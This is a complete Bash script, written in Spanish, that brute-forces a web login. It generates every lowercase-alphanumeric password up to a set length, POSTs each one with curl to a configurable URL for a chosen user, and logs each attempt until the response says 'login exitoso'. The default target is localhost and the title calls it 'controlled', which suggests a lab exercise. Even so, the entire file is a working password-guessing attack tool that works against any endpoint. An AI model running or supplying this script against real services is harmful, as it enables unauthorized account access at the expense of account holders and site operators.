#!/usr/bin/env bash
set -u
URL="${1:-http://127.0.0.1:8000/login}"
USER="${2:-Daniel}"
MAXLEN="${3:-10}"
DELAY="${4:-0.05}"
LOGFILE="attack_log.txt"
CHARSET="0123456789abcdefghijklmnopqrstuvwxyz"
start_iso=$(date --iso-8601=seconds)
echo "=== Fuerza bruta generativa (controlada) ===" > "$LOGFILE"
echo "Objetivo: $URL  usuario: $USER" >> "$LOGFILE"
echo "Charset: $CHARSET" >> "$LOGFILE"
echo "Máxima longitud: $MAXLEN" >> "$LOGFILE"
echo "Inicio: $start_iso" >> "$LOGFILE"
echo "INICIANDO ATAQUE - Inicio: $start_iso"
attempts=0
found_pw=""
start_ts=$(date +%s.%N)
try_password() {
  local pw="$1"
  ((attempts++))
  response=$(curl -s -S -m 5 -X POST "$URL" \
    -H "Content-Type: application/json" \
    -d "{\"name\":\"${USER}\",\"password\":\"${pw}\"}" ) || {
      echo "$(date --iso-8601=seconds) ERROR request $pw" >> "$LOGFILE"
      return 1
    }
  echo "$(date --iso-8601=seconds) Intento #${attempts} -> ${pw} Response: ${response}" >> "$LOGFILE"
  if echo "$response" | grep -q "login exitoso"; then
    found_pw="$pw"
    elapsed=$(awk "BEGIN {print $(date +%s.%N) - $start_ts}")
    echo "$(date --iso-8601=seconds) *** CONTRASEÑA ENCONTRADA: $found_pw (intentos=$attempts, tiempo=${elapsed}s)" >> "$LOGFILE"
    echo "CONTRASEÑA ENCONTRADA: $found_pw (intentos=$attempts, tiempo=${elapsed}s)"
    return 0
  fi
  sleep "$DELAY"
  return 1
}
generate_len() {
  local len="$1"
  local prefix="$2"
  if [ "$len" -eq 0 ]; then
    try_password "$prefix" && return 0
    return 1
  fi
  local i
  for ((i=0; i<${#CHARSET}; i++)); do
    ch="${CHARSET:i:1}"
    if [ -n "$found_pw" ]; then
      return 0
    fi
    generate_len $((len-1)) "${prefix}${ch}" && return 0
  done
  return 1
}
for ((L=1; L<=MAXLEN; L++)); do
  generate_len "$L" "" && break
done
total_time=$(awk "BEGIN {print $(date +%s.%N) - $start_ts}")
if [ -n "$found_pw" ]; then
  echo "CONTRASEÑA ENCONTRADA: $found_pw"
else
  echo "CONTRASEÑA NO ENCONTRADA en el espacio (long<=${MAXLEN})"
fi
echo "Intentos totales: $attempts"
printf "Tiempo total: %.3f segundos\n" "$total_time"
echo "Log guardado en: $LOGFILE"
